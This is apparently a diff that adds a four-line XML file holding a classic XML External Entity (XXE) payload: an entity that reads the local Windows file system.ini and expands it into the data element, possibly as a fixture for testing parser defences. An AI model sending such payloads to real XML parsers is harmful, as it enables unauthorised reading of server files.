@@ -1,0 +1,4 @@
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini">
+]>
+<data>&xxe;</data>
